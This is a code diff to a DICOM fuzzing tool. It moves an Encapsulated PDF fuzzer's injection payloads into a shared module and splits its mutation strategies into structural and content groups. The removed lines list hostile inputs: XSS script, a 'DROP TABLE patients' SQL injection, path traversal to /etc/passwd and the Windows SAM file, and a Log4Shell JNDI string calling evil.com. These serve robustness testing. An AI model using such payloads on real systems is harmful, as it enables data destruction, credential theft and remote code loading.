@@ -21,6 +21,7 @@ from pydicom.sequence import Sequence
 from dicom_fuzzer.utils.logger import get_logger
 
 from .base import FormatFuzzerBase
+from .dicom_dictionaries import INJECTION_PAYLOADS
 
 logger = get_logger(__name__)
 
@@ -37,18 +38,6 @@ _FAKE_PAYLOADS = {
     "html": b"<html><script>alert(1)</script></html>",
 }
 
-_INJECTION_PAYLOADS = [
-    "<script>alert('xss')</script>",
-    "'; DROP TABLE patients; --",
-    "../../../etc/passwd",
-    "..\\..\\..\\windows\\system32\\config\\sam",
-    "${jndi:ldap://evil.com/a}",
-    "A" * 10000,
-    "",
-    "\x00" * 16,
-    "\n" * 500,
-]
-
 
 class EncapsulatedPdfFuzzer(FormatFuzzerBase):
     """Fuzzes DICOM Encapsulated PDF objects to test document handling robustness.
@@ -61,14 +50,17 @@ class EncapsulatedPdfFuzzer(FormatFuzzerBase):
     def __init__(self) -> None:
         """Initialize the encapsulated PDF fuzzer with attack strategies."""
         super().__init__()
-        self.mutation_strategies = [
-            self._document_size_attack,
-            self._mime_type_mismatch,
-            self._malformed_pdf_injection,
-            self._pdf_metadata_corruption,
-            self._pdf_structure_corruption,
-            self._type_confusion,
+        self.structural_strategies = [
+            self._document_size_attack,  # [STRUCTURAL] zero/truncated doc — allocation boundary
+            self._malformed_pdf_injection,  # [STRUCTURAL] non-PDF headers trigger codec dispatch failure
+            self._pdf_structure_corruption,  # [STRUCTURAL] corrupt xref/streams/page tree — PDF parser crash
+            self._type_confusion,  # [STRUCTURAL] non-bytes in OB field — VR dispatch failure
         ]
+        self.content_strategies = [
+            self._mime_type_mismatch,  # [CONTENT] wrong MIMEType string — metadata only
+            self._pdf_metadata_corruption,  # [CONTENT] DocumentTitle strings — no parse effect
+        ]
+        self.mutation_strategies = self.structural_strategies + self.content_strategies
 
     @property
     def strategy_name(self) -> str:
@@ -90,8 +82,9 @@ class EncapsulatedPdfFuzzer(FormatFuzzerBase):
             Mutated dataset with document payload corruptions
 
         """
-        num_strategies = random.randint(1, 2)
-        selected = random.sample(self.mutation_strategies, num_strategies)
+        selected = random.sample(self.structural_strategies, k=random.randint(1, 2))
+        if random.random() < 0.33:
+            selected.append(random.choice(self.content_strategies))
         self.last_variant = ",".join(s.__name__ for s in selected)
 
         for strategy in selected:
@@ -210,7 +203,7 @@ class EncapsulatedPdfFuzzer(FormatFuzzerBase):
 
         try:
             if attack == "title_injection":
-                dataset.DocumentTitle = random.choice(_INJECTION_PAYLOADS)
+                dataset.DocumentTitle = random.choice(INJECTION_PAYLOADS)
             elif attack == "title_boundary":
                 dataset.DocumentTitle = random.choice(
                     [
@@ -237,7 +230,7 @@ class EncapsulatedPdfFuzzer(FormatFuzzerBase):
                         "\x00",
                     ]
                 )
-                seq_item.CodeMeaning = random.choice(_INJECTION_PAYLOADS)
+                seq_item.CodeMeaning = random.choice(INJECTION_PAYLOADS)
                 dataset.ConceptNameCodeSequence = Sequence([seq_item])
             elif attack == "concept_name_remove":
                 if "ConceptNameCodeSequence" in dataset:
